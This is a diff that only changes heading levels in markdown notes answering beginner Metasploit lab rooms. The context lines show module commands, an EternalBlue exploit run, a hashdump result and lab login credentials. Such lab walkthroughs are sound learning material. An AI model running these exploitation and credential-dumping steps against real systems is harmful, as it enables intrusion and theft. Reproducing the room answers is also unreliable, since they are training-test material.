@@ -35,8 +35,8 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
   1. Customize the exploit
   1. Exploit the vulnerable service
 
-### Questions
-#### Task 2
+## Questions
+### Task 2
 - What is the name of the code taking advantage of a flaw on the target system?
   > Exploit
 - What is the name of the code that runs on the target system to achieve the attacker's goal?
@@ -45,7 +45,7 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
   > Singles
 - Is "windows/x64/pingback_reverse_tcp" among singles or staged payload?
   > Singles
-#### Task 3
+### Task 3
 - How would you search for a module related to Apache?
   > search apache
 - Who provided the auxiliary/scanner/ssh/ssh_login module?
@@ -53,7 +53,7 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
   info auxiliary/scanner/ssh/ssh_login
   ```
   > todb
-#### Task 4
+### Task 4
 - How would you set the LPORT value to 6666?
   > set LPORT 6666
 - How would you set the global value for RHOSTS to 10.10.19.23 ?
@@ -93,8 +93,8 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
     - set up handler accordingly with payload, lhost, lport of payload, same values
 - **Meterpreter** is a powerful tool that offers a lot of easy to use features during the post-exploitation phase.
 
-### Questions
-#### Task 2
+## Questions
+### Task 2
 - How many ports are open on the target system?
   ```
   nmap <target_ip>
@@ -124,7 +124,7 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
   run
   ```
   > leo1234
-#### Task 5
+### Task 5
 - Exploit one of the critical vulnerabilities on the target VM
   ```
   use exploit/windows/smb/ms17_010_eternalblue
@@ -145,7 +145,7 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
   hashdump
   ```
   > 8ce9a3ebd1647fcc5e04025019f4b875
-#### Task 6
+### Task 6
 - Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.
   ```
   ssh murphy@<target_ip> 
@@ -179,5 +179,5 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
 
 # Metasploit: Meterpreter
 
-### Questions
-#### Task 
+## Questions
+### Task 
